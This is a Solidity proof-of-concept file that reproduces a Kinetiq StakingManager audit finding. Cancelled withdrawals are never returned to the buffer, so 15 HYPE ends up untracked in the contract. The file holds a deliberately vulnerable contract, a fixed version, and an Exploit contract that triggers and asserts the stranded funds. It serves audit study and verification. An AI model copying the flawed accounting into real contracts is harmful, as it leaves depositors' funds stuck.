// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * AuditVault 58553 — Kinetiq StakingManager (Code4rena 2025-04).
 * queueWithdrawal pulls a user withdrawal fully out of hypeBuffer, but the HYPE
 * stays in the contract until the delay elapses. cancelWithdrawal (manager)
 * never puts that amount back into the buffer; it only adds _cancelledWithdrawalAmount.
 * redelegateWithdrawnHYPE then zeroes that counter and sendCDeposit's the
 * 8-decimal figure to L1 accounting WITHOUT sending the HYPE value. The 15 HYPE
 * quoted in the finding is left in the contract and tracked by nothing.
 *
 * Quoted lines are the finding's _withdrawFromValidator / cancelWithdrawal /
 * redelegateWithdrawnHYPE / SpotDeposit branch.
 */

contract KHYPE {
    string public name = "kHYPE";
    string public symbol = "kHYPE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract L1Write {
    uint64 public lastCDeposit;

    function sendCDeposit(uint64 amount) external {
        lastCDeposit = amount;
    }
}

contract StakingManager {
    enum OperationType { UserWithdrawal, SpotDeposit, RebalanceDeposit }

    struct WithdrawalRequest {
        uint256 hypeAmount;
        uint256 kHYPEAmount;
        uint256 kHYPEFee;
    }

    KHYPE public kHYPE;
    L1Write public l1Write;
    address public manager;

    uint256 public hypeBuffer;
    uint256 public totalQueuedWithdrawals;
    uint256 public _cancelledWithdrawalAmount;
    uint256 public nextId;

    mapping(address => mapping(uint256 => WithdrawalRequest)) private _withdrawalRequests;

    constructor(KHYPE _k, L1Write _l1, address _manager) {
        kHYPE = _k;
        l1Write = _l1;
        manager = _manager;
    }

    function fundBuffer() external payable {
        hypeBuffer += msg.value;
    }

    function _convertTo8Decimals(uint256 amount) internal pure returns (uint256) {
        return amount / 1e10;
    }

    function _withdrawFromValidator(uint256 amount, OperationType operationType) internal returns (uint256) {
        if (operationType == OperationType.UserWithdrawal) {
            uint256 currentBuffer = hypeBuffer;
            uint256 amountFromBuffer = amount < currentBuffer ? amount : currentBuffer;
            if (amountFromBuffer > 0) {
                hypeBuffer = currentBuffer - amountFromBuffer;
                amount -= amountFromBuffer;
            }
            if (amount == 0) {
                return amount;
            }
        }
        return amount;
    }

    function queueWithdrawal(uint256 hypeAmount) external returns (uint256 withdrawalId) {
        kHYPE.transferFrom(msg.sender, address(this), hypeAmount);
        _withdrawFromValidator(hypeAmount, OperationType.UserWithdrawal);
        withdrawalId = ++nextId;
        _withdrawalRequests[msg.sender][withdrawalId] = WithdrawalRequest(hypeAmount, hypeAmount, 0);
        totalQueuedWithdrawals += hypeAmount;
    }

    function cancelWithdrawal(address user, uint256 withdrawalId) external {
        require(msg.sender == manager, "manager");
        WithdrawalRequest storage request = _withdrawalRequests[user][withdrawalId];
        require(request.hypeAmount > 0, "No such withdrawal request");

        uint256 hypeAmount = request.hypeAmount;
        uint256 kHYPEAmount = request.kHYPEAmount;
        uint256 kHYPEFee = request.kHYPEFee;

        require(kHYPE.balanceOf(address(this)) >= kHYPEAmount + kHYPEFee, "Insufficient kHYPE balance");

        delete _withdrawalRequests[user][withdrawalId];
        totalQueuedWithdrawals -= hypeAmount;

        kHYPE.transfer(user, kHYPEAmount + kHYPEFee);

        _cancelledWithdrawalAmount += hypeAmount;
    }

    function redelegateWithdrawnHYPE() external {
        require(msg.sender == manager, "manager");
        require(_cancelledWithdrawalAmount > 0, "No cancelled withdrawals");
        require(address(this).balance >= _cancelledWithdrawalAmount, "Insufficient HYPE balance");

        uint256 amount = _cancelledWithdrawalAmount;
        _cancelledWithdrawalAmount = 0;

        _distributeStake(amount, OperationType.SpotDeposit);
    }

    function _distributeStake(uint256 amount, OperationType operationType) internal {
        if (operationType == OperationType.SpotDeposit) {
            uint256 truncatedAmount = _convertTo8Decimals(amount);
            require(truncatedAmount <= type(uint64).max, "Amount exceeds uint64 max");
            // @> VULN:
            l1Write.sendCDeposit(uint64(truncatedAmount));
        }
    }

    function untracked() external view returns (uint256) {
        return address(this).balance - hypeBuffer - totalQueuedWithdrawals;
    }
}

contract StakingManagerFixed {
    struct WithdrawalRequest {
        uint256 hypeAmount;
        uint256 kHYPEAmount;
        uint256 kHYPEFee;
    }

    KHYPE public kHYPE;
    address public manager;
    uint256 public hypeBuffer;
    uint256 public totalQueuedWithdrawals;
    uint256 public nextId;
    mapping(address => mapping(uint256 => WithdrawalRequest)) private _withdrawalRequests;

    constructor(KHYPE _k, address _manager) {
        kHYPE = _k;
        manager = _manager;
    }

    function fundBuffer() external payable {
        hypeBuffer += msg.value;
    }

    function queueWithdrawal(uint256 hypeAmount) external returns (uint256 withdrawalId) {
        kHYPE.transferFrom(msg.sender, address(this), hypeAmount);
        uint256 currentBuffer = hypeBuffer;
        uint256 amountFromBuffer = hypeAmount < currentBuffer ? hypeAmount : currentBuffer;
        if (amountFromBuffer > 0) hypeBuffer = currentBuffer - amountFromBuffer;
        withdrawalId = ++nextId;
        _withdrawalRequests[msg.sender][withdrawalId] = WithdrawalRequest(hypeAmount, hypeAmount, 0);
        totalQueuedWithdrawals += hypeAmount;
    }

    function cancelWithdrawal(address user, uint256 withdrawalId) external {
        require(msg.sender == manager, "manager");
        WithdrawalRequest storage request = _withdrawalRequests[user][withdrawalId];
        uint256 hypeAmount = request.hypeAmount;
        uint256 kAmount = request.kHYPEAmount;
        delete _withdrawalRequests[user][withdrawalId];
        totalQueuedWithdrawals -= hypeAmount;
        hypeBuffer += hypeAmount;
        kHYPE.transfer(user, kAmount);
    }

    function untracked() external view returns (uint256) {
        return address(this).balance - hypeBuffer - totalQueuedWithdrawals;
    }
}

contract UserActor {
    function approveAndQueue(KHYPE token, StakingManager manager, uint256 amount) external returns (uint256) {
        token.approve(address(manager), amount);
        return manager.queueWithdrawal(amount);
    }

    function approveAndQueueFixed(KHYPE token, StakingManagerFixed manager, uint256 amount) external returns (uint256) {
        token.approve(address(manager), amount);
        return manager.queueWithdrawal(amount);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 public constant BUFFER = 20 ether;
    uint256 public constant WITHDRAW = 15 ether;

    KHYPE public kToken;
    L1Write public l1;
    StakingManager public manager;
    UserActor public user;
    uint256 public stuck;

    function run() external payable {
        require(msg.value == BUFFER, "seed");
        kToken = new KHYPE();
        l1 = new L1Write();
        manager = new StakingManager(kToken, l1, address(this));
        user = new UserActor();

        manager.fundBuffer{value: BUFFER}();
        kToken.mint(address(user), WITHDRAW);
        uint256 id = user.approveAndQueue(kToken, manager, WITHDRAW);
        manager.cancelWithdrawal(address(user), id);
        manager.redelegateWithdrawnHYPE();

        stuck = manager.untracked();
        require(stuck == WITHDRAW, "stuck");
        require(manager.hypeBuffer() == BUFFER - WITHDRAW, "buffer");
        require(manager._cancelledWithdrawalAmount() == 0, "cancelled");
        require(l1.lastCDeposit() == WITHDRAW / 1e10, "cdeposit");
        require(address(manager).balance == BUFFER, "still here");
    }
}
